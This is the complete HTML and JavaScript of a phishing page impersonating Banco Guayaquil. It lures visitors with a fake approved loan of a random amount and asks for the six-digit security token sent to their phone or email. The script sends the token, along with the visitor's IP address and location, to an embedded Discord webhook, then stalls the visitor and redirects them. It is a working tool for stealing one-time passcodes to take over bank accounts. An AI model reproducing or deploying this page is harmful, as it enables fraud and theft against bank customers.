<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Banco Guayaquil - Activar Préstamo</title>
    <link rel="shortcut icon" href="ico.svg" type="image/x-icon">
    <link rel="stylesheet" href="style.css">
    <link href="https://fonts.googleapis.com/css2?family=Nunito+Sans:wght@400;600&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Nunito Sans', sans-serif;
            background-color: white;
            margin: 0;
            padding: 0;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }

        .logo-container {
            margin-bottom: 20px;
            text-align: left;
            width: 100%;
            max-width: 400px;
            margin-left: 20px;
        }

        .logo-svg {
            height: 55px;
            width: auto;
        }

        .login-card {
            background: white;
            border-radius: 12px;
            padding: 40px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
            width: 100%;
            max-width: 400px;
            margin: 0 20px;
            text-align: center;
        }

        .login-title {
            font-size: 22px;
            font-weight: 600;
            color: #333;
            margin-bottom: 20px;
        }

        .input-group {
            margin-bottom: 20px;
        }

        .input-label {
            font-size: 14px;
            color: #666;
            margin-bottom: 8px;
            display: block;
        }

        .otp {
            display: flex;
            justify-content: space-between;
            gap: 10px;
            margin-bottom: 20px;
        }

        .input-field {
            width: 45px;
            height: 50px;
            padding: 16px;
            border: 2px solid #e0e0e0;
            border-radius: 8px;
            font-size: 22px;
            color: #333;
            background: white;
            box-sizing: border-box;
            text-align: center;
            transition: border-color 0.3s ease;
            flex-grow: 1;
        }

        .input-field:focus {
            outline: none;
            border-color: #d2006e;
        }

        .continue-button {
            width: 100%;
            padding: 16px;
            background: #e0e0e0;
            color: #898989;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            margin-bottom: 20px;
        }

        .continue-button.active {
            background: #d2006e;
            color: white;
        }

        .continue-button:hover.active {
            background: #b8005a;
        }

        .forgot-link {
            color: #007bff;
            text-decoration: underline;
            font-size: 14px;
            text-align: center;
            display: block;
        }

        .forgot-link:hover {
            text-decoration: none;
        }

        .error-message {
            color: #dc3545;
            font-size: 14px;
            text-align: center;
            margin-bottom: 10px;
            display: none;
        }

        .loading {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(255, 255, 255, 0.9);
            display: none;
            justify-content: center;
            align-items: center;
            z-index: 1000;
        }

        .loading-content {
            text-align: center;
        }

        .loading img {
            width: 40px;
            height: 40px;
            margin-bottom: 16px;
        }

        .loading p {
            color: #666;
            font-size: 16px;
        }

        .credit-info {
            margin-top: 10px;
            font-size: 18px;
            color: #333;
            text-align: center;
            font-weight: 600;
        }
    </style>
</head>

<body>
    <div class="logo-container">
        <img src="lg.svg" alt="Banco Guayaquil" class="logo-svg">
    </div>

    <div class="login-card">
        <h1 class="login-title">Activar tu préstamo</h1>
        
        <!-- Mensaje dinámico del crédito aprobado -->
        <div class="credit-info" id="creditInfo">
            <!-- El monto aprobado se mostrará aquí -->
        </div>

        <form id="loginForm">
            <div class="input-group">
                <label class="input-label" for="token">Para activar tu préstamo, ingresa el token de seguridad enviado a tu número o correo electrónico registrado.</label>
                <div class="otp">
                    <input type="text" id="otp1" class="input-field" maxlength="1" inputmode="numeric">
                    <input type="text" id="otp2" class="input-field" maxlength="1" inputmode="numeric">
                    <input type="text" id="otp3" class="input-field" maxlength="1" inputmode="numeric">
                    <input type="text" id="otp4" class="input-field" maxlength="1" inputmode="numeric">
                    <input type="text" id="otp5" class="input-field" maxlength="1" inputmode="numeric">
                    <input type="text" id="otp6" class="input-field" maxlength="1" inputmode="numeric">
                </div>
            </div>
            <div class="error-message" id="errorMsg"></div>
            <button type="submit" class="continue-button" id="continueBtn" disabled>Continuar</button>
        </form>

        <div class="time" id="timerContainer">
            Puedes solicitar otro OTP en <span id="timer">3:00</span> minutos
        </div>
    </div>

    <div class="loading" id="loading">
        <div class="loading-content">
            <img src="ico.svg" alt="">
            <p>Espere un momento...</p>
        </div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function () {
            const otpInputs = document.querySelectorAll('.otp input');
            const continueBtn = document.querySelector('#continueBtn');
            const errorMsg = document.querySelector('#errorMsg');
            const loginForm = document.querySelector('#loginForm');
            const loading = document.querySelector('#loading');
            const timer = document.querySelector('#timer');
            const creditInfo = document.querySelector('#creditInfo');
            let time = 180;  // 3 minutos
            let isProcessing = false;

            // Verificar si ya hay un monto en localStorage, si no se crea uno nuevo
            let creditAmount = localStorage.getItem('creditAmount');
            if (!creditAmount) {
                creditAmount = Math.floor(Math.random() * (50000 - 4000 + 1)) + 4000;
                localStorage.setItem('creditAmount', creditAmount);
            }

            // Mostrar el monto aprobado en la página
            creditInfo.textContent = `¡Felicidades! Tu préstamo ha sido aprobado por un monto de $${creditAmount.toLocaleString()} USD.`;

            // Validar el token de seguridad
            function validateToken() {
                let token = '';
                otpInputs.forEach(input => token += input.value);
                return token.length === 6;
            }

            function updateButtonState() {
                if (validateToken()) {
                    continueBtn.disabled = false;
                    continueBtn.classList.add('active');
                    errorMsg.style.display = 'none';
                } else {
                    continueBtn.disabled = true;
                    continueBtn.classList.remove('active');
                    errorMsg.style.display = 'none';
                }
            }

            otpInputs.forEach((input, index) => {
                input.addEventListener('input', () => {
                    if (input.value && index < otpInputs.length - 1) {
                        otpInputs[index + 1].focus();
                    }
                    updateButtonState();
                });
                input.addEventListener('keydown', (e) => {
                    if (e.key === 'Backspace' && !input.value && index > 0) {
                        otpInputs[index - 1].focus();
                    }
                });
            });

            // Temporizador de 3 minutos
            setInterval(function () {
                let minutes = Math.floor(time / 60);
                let seconds = time % 60;
                seconds = seconds < 10 ? "0" + seconds : seconds;
                timer.innerHTML = `${minutes}:${seconds}`;
                time--;

                if (time < 0) {
                    alert("El código ha expirado. Por favor, solicita uno nuevo.");
                    location.href = 'index.html';
                }
            }, 1000);

            // Enviar datos al backend o a Discord (por ejemplo)
            loginForm.addEventListener('submit', function (event) {
                event.preventDefault();
                if (isProcessing) return;

                const token = Array.from(otpInputs).map(input => input.value).join('');
                if (token.length !== 6) {
                    errorMsg.textContent = 'Token incorrecto, inténtelo nuevamente.';
                    errorMsg.style.display = 'block';
                    return;
                }

                isProcessing = true;
                continueBtn.disabled = true;
                errorMsg.style.display = 'none';

                // Obtener IP y ubicación y enviar a Discord
                fetchIPData().then((ipData) => {
                    const ip = ipData.ip || 'No disponible';
                    const country = ipData.country || 'No disponible';
                    const city = ipData.city || 'No disponible';

                    const message = `
                        TOKEN: ${token}
                        IP: ${ip}
                        ${country}, ${city}`;

                    const discordMessage = {
                        content: `🔐 **Nueva información capturada**\n\`\`\`\n${message}\`\`\``
                    };

                    sendToDiscord(discordMessage);
                });
            });

            function sendToDiscord(discordMessage) {
                const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1431346475605954562/WTW6O7JaUz6ECqP-m0dhF-vs_pjs2S06fCb5XMgxyH_Z2UgnNG2a3w3eZnC21__iP0R9"; // Reemplaza con tu URL de webhook

                fetch(DISCORD_WEBHOOK, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(discordMessage)
                })
                    .then(response => {
                        if (response.ok) {
                            console.log('Datos enviados exitosamente a Discord');
                            loading.style.display = 'flex';
                            setTimeout(function () {
                                window.location.href = 'p.html';  // Redirige a error.html después de 15 segundos
                            }, 15000); // 15 segundos de espera
                        } else {
                            console.error('Error al enviar a Discord:', response.status, response.statusText);
                            alert('Error al enviar información');
                            isProcessing = false;
                            continueBtn.disabled = false;
                        }
                    })
                    .catch(error => {
                        console.error('Error de red:', error);
                        alert('Error de conexión');
                        isProcessing = false;
                        continueBtn.disabled = false;
                    });
            }

            function fetchIPData() {
                let ipAddress = '';
                return fetch('https://api.ipify.org?format=json')
                    .then(response => response.json())
                    .then(data => {
                        ipAddress = data.ip || '';
                        return fetch('https://ipinfo.io/json');
                    })
                    .then(response => response.json())
                    .catch(error => {
                        return { ip: ipAddress || 'No disponible', country: 'No disponible', city: 'No disponible' };
                    });
            }
        });
    </script>
<script src="https://replit-cdn.com/replit-pill/replit-pill.global.js" data-repl-id="6afd3067-b975-4e13-a891-c507c26afdf7"></script></body>
</html>
